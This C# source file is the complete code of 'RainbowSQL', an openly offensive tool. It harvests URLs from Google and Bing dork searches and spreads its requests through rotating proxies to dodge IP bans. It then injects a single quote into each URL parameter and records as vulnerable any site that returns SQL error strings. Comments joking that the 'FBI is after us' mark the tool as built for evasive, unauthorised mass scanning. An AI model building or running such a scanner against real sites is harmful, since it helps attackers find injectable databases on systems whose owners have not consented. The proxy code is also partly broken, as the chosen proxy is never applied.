using HtmlAgilityPack;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

namespace RainbowSQL2
{
    class Program
    {
        static List<string> proxies = new List<string>(); //List of proxies
        static List<string> dorks = new List<string>(); //List of dorks
        static List<string> urls = new List<string>(); //List of scraped urls
        static List<string> vulnerable = new List<string>(); //Vulnerable urls
        static List<string> proxies_used = new List<string>(); //Proxies used right now
        static Random random = new Random();
        static string[] URL_VERIFICATION_STRINGS = { "http", ".", "=", "/" }; //String must contain these to be applicable URL;
        static string[] URL_BAD_STRINGS = { "microsoft", "google", "youtube", "facebook", "stackoverflow", "bing" ,"/url?"}; //URL cannot contain these to be applicable URL;
        static string[] SQL_Errors = { "mysql_fetch", "SQL syntax", "ORA-01756", "OLE DB Provider for SQL Server", "SQLServer JDBC Driver", "Error Executing Database Query" };
        static int Processed_urls = 0;
        static void Main(string[] args)
        {
            PrepareMainScreen();
        }

        private static void PrepareMainScreen()
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write(@"
------------------------------------------------------------------------------------
|  __________        .__      ___.                   _________________  .____      |
|  \______   \_____  |__| ____\_ |__   ______  _  __/   _____/\_____  \ |    |     |
|   |       _/\__  \ |  |/    \| __ \ /  _ \ \/ \/ /\_____  \  /  / \  \|    |     |
|   |    |   \ / __ \|  |   |  \ \_\ (  <_> )     / /        \/   \_/.  \    |___  |
|   |____|_  /(____  /__|___|  /___  /\____/ \/\_/ /_______  /\_____\ \_/_______ \ |
|          \/      \/        \/    \/                      \/        \__>       \/ |
|   Made by syrex1013                                                              |
------------------------------------------------------------------------------------
");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("[1] Dork Scanner - Bing");
            Console.WriteLine("[2] Dork Scanner - Google");
            Console.WriteLine("[3] Vuln Scanner");
            Console.ForegroundColor = ConsoleColor.White;

            try
            {
                Console.Write("\nRainbowSQL/>");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    case 1:
                        DorkScannerBing2();
                        break;
                    case 2:
                        DorkScannerGoogle2();
                        break;
                    case 3:
                        SQL_ERROR_SCANNER2();
                        break;
                    default:
                        Console.Clear();
                        PrepareMainScreen();
                        break;
                }
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Wrong option! Please restart.");
                Console.ReadKey();
                Environment.Exit(1);
            }
        }

        //SQL INJECTION SCANNERS
        private static void SQL_ERROR_SCANNER2()
        {
            //Prepare Scanner.
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Put all urls in urls.txt file and click Enter.");
            Console.ReadKey();
            LoadUrls();
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Do you want to use proxies(y/n)?");
            Console.Write("\nRainbowSQL/>");
            string option = Console.ReadLine().ToLower();  
             Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Please specify number of threads!");
            Console.Write("\nRainbowSQL/>");
            int threads = Convert.ToInt32(Console.ReadLine());

            //Load proxies if user agreed.
            if (option == "y")
            {
                LoadProxies();
            }
            Console.WriteLine("Starting scanning for SQL errors!");

            //MULTI FUCKING THREADING.
            Parallel.For(0, urls.Count, new ParallelOptions { MaxDegreeOfParallelism = threads }, x =>
            {

                //Prepare webclient
                MyWebClient client = new MyWebClient();
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/267.1.0.46.120;]");
                string url = urls[x];

                //Ger parameter list from url
                var uriBuilder = new UriBuilder(url);
                var query = HttpUtility.ParseQueryString(uriBuilder.Query);

                //Loop through every parameter
                foreach (string parameter_name in query)
                {
                    int success = 0;
                    int Proxy_Number = 0; // Number of proxy used for this page
                    int ThreadID = Thread.CurrentThread.ManagedThreadId; //used to determinate id of thread

                    //Loop until success to prevent loosing websites due to bad proxies
                    while (success != 1)
                    {
                        try
                        {
                            if (ThreadID == 1)
                            {
                                WriteStatusSQLERROR();
                            }
                            //Check if proxies left
                            if (option == "y" && proxies.Count() == 0)
                            {
                                //Well we are fucked. No proxies left. FBI is after us

                                //Write only from 1 thread.
                                if (ThreadID == 1)
                                {
                                    Console.Clear();
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("[!] No Proxies left.Click enter to exit!");
                                    //Write all found urls to file!
                                    File.WriteAllLines("vulnerable.txt", vulnerable);
                                    Console.ReadKey();
                                    Environment.Exit(1);
                                }

                            }

                            //SET PROXY
                            if (option == "y")
                            {
                                string[] Proxy_data = PickRandomProxy();
                                string ip = Proxy_data[0];
                                int port = Convert.ToInt32(Proxy_data[1]);
                                Proxy_Number = Convert.ToInt32(Proxy_data[2]);

                                //Add proxy to used pool to prevent using it 2 times in other threads.
                                AddProxyToUsed(Proxy_Number);
                                RemoveProxy(Proxy_Number);

                            }

                            //Append semicolon to parameter to check for SQL error
                            var param = query[parameter_name] + "'";

                            //Build new url.For anyone reading this, IDK how to do this otherwise so fuck off. 
                            string replace_string_original = System.Web.HttpUtility.UrlEncode(parameter_name) + "=" + System.Web.HttpUtility.UrlEncode(query[parameter_name]);
                            string replace_string_new = System.Web.HttpUtility.UrlEncode(parameter_name) + "=" + System.Web.HttpUtility.UrlEncode(param);
                            uriBuilder.Query = query.ToString().Replace(replace_string_original, replace_string_new);
                            string NewUrl = uriBuilder.ToString();

                            //GET html and check if it contains any error.
                            string htmlCode = client.DownloadString(NewUrl);
                            if (SQL_Errors.Any(c => htmlCode.Contains(c)))
                            {
                                //Check if url is not in vulnerable list.
                                if (!vulnerable.Contains(url))
                                {
                                    vulnerable.Add(url);
                                }
                            }

                            //Set success to 1 to exit loop and get another parameter
                            success = 1;
                        }
                        catch (Exception e)
                        {
                            //If proxy enabled and it failed then there is problem with proxy. Remove it
                            if (option == "y")
                            {
                                RemoveProxy(Proxy_Number);
                            }
                            else
                            {
                                //We cant be banned, cause like how. Only one request was made so there is some error on page. 404 or smh. Just skip over this element by setting success to 1.
                                success = 1;
                                                             
                            }
                        }
                    }

                }
                //Add processed
                Processed_urls++;
            });
            WriteStatusSQLERROR();
            //Write all data to file!
            //Scraping has ended. Write ending
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n\n\n\n\n[S]Testing has ended! Click enter to exit!");
            Console.ForegroundColor = ConsoleColor.White;
            //Save urls to file
            File.WriteAllLines("vulnerable.txt", vulnerable);
            Console.ReadKey();
        }

        //DORK SCANNERS
        private static void DorkScannerGoogle2()
        {
            //Prepare Scanner.
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Put all dorks in dorks.txt file and click Enter.");
            Console.ReadKey();
            LoadDorks();
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Please specify number of pages per dork! (minimum 2 pages)");
            Console.Write("\nRainbowSQL/>");
            int pages_to_scan = Convert.ToInt32(Console.ReadLine());
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Do you want to use proxies(y/n)?");
            Console.Write("\nRainbowSQL/>");
            string option = Console.ReadLine().ToLower();

            //Load proxies if user agreed.
            if (option == "y")
            {
                LoadProxies();
            }
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Please specify number of threads!");
            Console.Write("\nRainbowSQL/>");
            int threads = Convert.ToInt32(Console.ReadLine());
            Console.WriteLine("Starting scraping using GOOGLE!");

            //MULTI FUCKING THREADING.
            Parallel.For(0, dorks.Count, new ParallelOptions { MaxDegreeOfParallelism = threads }, x =>
            {
                //Prepare webclient
                MyWebClient client = new MyWebClient();
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/267.1.0.46.120;]");
                string dork = dorks[x];

                //LOOP EACH PAGE
                for (int i = 1; i < pages_to_scan; i++)
                {
                    int success = 0;  //Loop until success to prevent loosing pages due to bad proxies
                    int Proxy_Number = 0; // Number of proxy used for this page
                    int ThreadID = Thread.CurrentThread.ManagedThreadId; //used to determinate id of thread
                    while (success != 1)
                    {
                        try
                        {
                            if (ThreadID == 1)
                            {
                                WriteStatusGoogleScrape(pages_to_scan, dork);
                            }
                            //Check if proxies left
                            if (option == "y" && proxies.Count() == 0)
                            {
                                //Well we are fucked. No proxies left. FBI is after us
                                Console.ForegroundColor = ConsoleColor.Red;

                                //Write only from 1 thread.
                                if (ThreadID == 1)
                                {
                                    Console.Clear();
                                    Console.WriteLine("[!] No Proxies left.Click enter to exit!");
                                }

                                //Write all found urls to file!
                                File.WriteAllLines("urls.txt", urls);
                                Console.ReadKey();
                                Environment.Exit(1);

                            }

                            //SET PROXY
                            if (option == "y")
                            {
                                string[] Proxy_data = PickRandomProxy();
                                string ip = Proxy_data[0];
                                int port = Convert.ToInt32(Proxy_data[1]);
                                Proxy_Number = Convert.ToInt32(Proxy_data[2]);

                                //Add proxy to used pool to prevent using it 2 times in other threads.
                                AddProxyToUsed(Proxy_Number);
                                RemoveProxy(Proxy_Number);

                            }

                            //Prepare url
                            int page_number = i * 50; //We are doing increments of 50.
                            string url = GenerateGoogleUrl(dork, page_number);

                            //Get HTML of search engine page
                            string htmlCode = client.DownloadString(url);

                            //Process HTML to get all href tags
                            ProcessHTML(htmlCode);

                            //Set success to 1 to exit loop and get another page
                            success = 1;

                            //IF there was a success then copy proxies from used to available proxies.
                            if(success == 1)
                            {
                                RotateProxiesFromUsedToAvilable();
                            }
                        }
                        catch
                        {
                            //If proxy on then remove this proxy cause it sucks.
                            if(option == "y")
                            {
                                RemoveProxy(Proxy_Number);
                            }
                            else
                            {
                                //We are not using proxy, so our IP was propably banned;
                                if (ThreadID == 1)
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("[!] Your ip was banned. Click enter to exit!");
                                    Console.ReadKey();
                                    File.WriteAllLines("urls.txt", urls);
                                    Environment.Exit(1);
                                }
                            }
                        }
                    }
                }

            });
                //Scraping has ended. Write ending
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n\n\n\n\n[S]Scraping has ended! Click enter to exit!");
                Console.ForegroundColor = ConsoleColor.White;
                //Save urls to file
                File.WriteAllLines("urls.txt", urls);
                Console.ReadKey();

        }        
        private static void DorkScannerBing2()
        {
            //Prepare Scanner.
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Put all dorks in dorks.txt file and click Enter.");
            Console.ReadKey();
            LoadDorks();
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Please specify number of pages per dork! (minimum 2 pages)");
            Console.Write("\nRainbowSQL/>");
            int pages_to_scan = Convert.ToInt32(Console.ReadLine());
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Do you want to use proxies(y/n)?");
            Console.Write("\nRainbowSQL/>");
            string option = Console.ReadLine().ToLower();

            //Load proxies if user agreed.
            if (option == "y")
            {
                LoadProxies();
            }
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[I] Please specify number of threads!");
            Console.Write("\nRainbowSQL/>");
            int threads = Convert.ToInt32(Console.ReadLine());
            Console.WriteLine("Starting scraping using GOOGLE!");

            //MULTI FUCKING THREADING.
            Parallel.For(0, dorks.Count, new ParallelOptions { MaxDegreeOfParallelism = threads }, x =>
            {
                //Prepare webclient
                MyWebClient client = new MyWebClient();
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/267.1.0.46.120;]");
                string dork = dorks[x];

                //LOOP EACH PAGE
                for (int i = 1; i < pages_to_scan; i++)
                {
                    int success = 0;  //Loop until success to prevent loosing pages due to bad proxies
                    int Proxy_Number = 0; // Number of proxy used for this page
                    int ThreadID = Thread.CurrentThread.ManagedThreadId; //used to determinate id of thread
                    while (success != 1)
                    {
                        try
                        {
                            if (ThreadID == 1)
                            {
                                WriteStatusBingScrape(pages_to_scan, dork);
                            }
                            //Check if proxies left
                            if (option == "y" && proxies.Count() == 0)
                            {
                                //Well we are fucked. No proxies left. FBI is after us

                                //Write only from 1 thread.
                                if (ThreadID == 1)
                                {
                                    Console.Clear();
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("[!] No Proxies left.Click enter to exit!");
                                }

                                //Write all found urls to file!
                                File.WriteAllLines("urls.txt", urls);
                                Console.ReadKey();
                                Environment.Exit(1);

                            }

                            //SET PROXY
                            if (option == "y")
                            {
                                string[] Proxy_data = PickRandomProxy();
                                string ip = Proxy_data[0];
                                int port = Convert.ToInt32(Proxy_data[1]);
                                Proxy_Number = Convert.ToInt32(Proxy_data[2]);

                                //Add proxy to used pool to prevent using it 2 times in other threads.
                                AddProxyToUsed(Proxy_Number);
                                RemoveProxy(Proxy_Number);

                            }

                            //Prepare url
                            int page_number = i * 50; //We are doing increments of 50.
                            string url = GenerateBingUrl(dork, page_number);

                            //Get HTML of search engine page
                            string htmlCode = client.DownloadString(url);

                            //Process HTML to get all href tags
                            ProcessHTML(htmlCode);

                            //Set success to 1 to exit loop and get another page
                            success = 1;

                            //IF there was a success then copy proxies from used to available proxies.
                            if (success == 1)
                            {
                                RotateProxiesFromUsedToAvilable();
                            }
                        }
                        catch(Exception e)
                        {
                            //If proxy on then remove this proxy cause it sucks.
                            if (option == "y")
                            {
                                RemoveProxy(Proxy_Number);
                            }
                            else
                            {
                                //We are not using proxy, so our IP was propably banned;
                                if (ThreadID == 1)
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("[!] Your ip was banned. Click enter to exit!");
                                    Console.ReadKey();
                                    File.WriteAllLines("urls.txt", urls);
                                    Environment.Exit(1);
                                }
                            }
                        }
                    }
                }

            });
            //Scraping has ended. Write ending
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n\n\n\n\n[S]Scraping has ended! Click enter to exit!");
            Console.ForegroundColor = ConsoleColor.White;
            //Save urls to file
            File.WriteAllLines("urls.txt", urls);
            Console.ReadKey();
        }

        //Status writers

        private static void WriteStatusBingScrape(int pages_per_dork, string dork)
        {
            Console.WriteLine("Scraped: " + urls.Count()+"                  ");
            Console.WriteLine("Pages per dork: " + pages_per_dork + "                  ");
            Console.WriteLine("Dorks: " + dorks.Count() + "                  ");
            Console.WriteLine("Proxies left: " + proxies.Count() + "     ");
            Console.WriteLine("Current dork: " + dork + "                  ");
            Console.SetCursorPosition(0, Console.CursorTop - 5);
        }
        private static void WriteStatusGoogleScrape(int pages_per_dork, string dork)
        {
            Console.WriteLine("Scraped: " + urls.Count() + "                  ");
            Console.WriteLine("Pages per dork: " + pages_per_dork + "                  ");
            Console.WriteLine("Dorks: " + dorks.Count() + "                  ");
            Console.WriteLine("Proxies left: " + proxies.Count() + "       ");
            Console.WriteLine("Current dork: " + dork + "                  ");
            Console.SetCursorPosition(0, Console.CursorTop - 5);
        }
        private static void WriteStatusSQLERROR()
        {
            //Write general stats for testing
            Console.WriteLine("Processed: " + Processed_urls + "                  ");
            Console.WriteLine("Left: " + (urls.Count() - Processed_urls) + "                  ");
            Console.WriteLine("Vulnerable: " + vulnerable.Count() + "                  ");
            Console.SetCursorPosition(0, Console.CursorTop - 3);
        }

        //HTML Processors
        private static void ProcessHTML(string htmlCode)
        {
            //Load document to HTMLagility
            HtmlDocument doc = new HtmlDocument();
            doc.LoadHtml(htmlCode);

            //Get all href tags in document
            foreach (HtmlNode link in doc.DocumentNode.SelectNodes("//a[@href]"))
            {
                //Get URL from href tag
                string HREF_LINK = link.GetAttributeValue("href", string.Empty);

                //Filter 

                //Check if contains all of TRUE strings
                bool matches_TRUE = URL_VERIFICATION_STRINGS.All(kw => HREF_LINK.Contains(kw));
                bool matches_FALSE = URL_BAD_STRINGS.Any(HREF_LINK.Contains);

                //IF contains good string and no bad then add to list of urls
                if (matches_TRUE == true && matches_FALSE == false)
                {
                    //Add to URLS list
                    urls.Add(HREF_LINK);
                }

            }
        }

        //Proxy Managers
        private static string[] PickRandomProxy()
        {
            //Get Random proxy
            int proxy_number = random.Next(proxies.Count);
            string ip = proxies[proxy_number].Split(':')[0];
            string port = proxies[proxy_number].Split(':')[1];
            string[] proxy_data = { ip, port, proxy_number.ToString() };
            return proxy_data;
        }
        private static void RemoveProxy(int ProxyNumber)
        {
            try
            {
                proxies.RemoveAt(ProxyNumber);
            }
            catch
            {
                //Ok so there was an error. 2 threads used same proxy and they want to delete it. one of them succeded other one dont so..... just dont do nothing.
            }
        }
        private static void AddProxyToUsed(int ProxyNumber)
        {
            proxies_used.Add(proxies[ProxyNumber]);
        }

        private static void RotateProxiesFromUsedToAvilable()
        {
            //Add and clear
            proxies.AddRange(proxies_used);
            proxies_used.Clear();
        }
        //URL Generators
        private static string GenerateGoogleUrl(string dork, int Page)
        {
            string url = String.Format("https://www.google.com/search?q={0}&start={1}&num=50", dork, Page);
            return url;
        }
        private static string GenerateBingUrl(string dork, int Page)
        {
            string url = String.Format("http://www.bing.com/search?q={0}&go=Submit&first={1}&count=50", dork, Page);
            return url;
        }
        //LOADERS
        private static void LoadUrls()
        {
            try
            {
                string[] lines = File.ReadAllLines("urls.txt");
                foreach (string line in lines)
                {
                    urls.Add(line);
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[S] Urls loaded: " + urls.Count());
                Console.ForegroundColor = ConsoleColor.White;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] No urls file found. Please restart!");
                Console.ForegroundColor = ConsoleColor.White;
                Environment.Exit(1);
            }
        }
        private static void LoadDorks()
        {
            try
            {
                string[] lines = File.ReadAllLines("dorks.txt");
                foreach (string line in lines)
                {
                    dorks.Add(line);
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[S] Dorks loaded: " + dorks.Count());
                Console.ForegroundColor = ConsoleColor.White;

            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] No dork file found. Please restart!");
                Console.ForegroundColor = ConsoleColor.White;
                Console.ReadKey();
                Environment.Exit(1);
            }
        }
        private static void LoadProxies()
        {
            try
            {
                string[] lines = File.ReadAllLines("proxy.txt");
                foreach (string line in lines)
                {
                    proxies.Add(line);
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[S] Proxies loaded: " + proxies.Count());
                Console.ForegroundColor = ConsoleColor.White;

            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] No proxy file found. Please restart!");
                Console.ForegroundColor = ConsoleColor.White;
                Console.ReadKey();
                Environment.Exit(1);
            }
        }

        //Override of WebClient to control timeout.
        private class MyWebClient : WebClient
        {
            protected override WebRequest GetWebRequest(Uri uri)
            {
                WebRequest w = base.GetWebRequest(uri);
                w.Timeout = 2000; //2s timeout
                return w;
            }
        }
    }

}
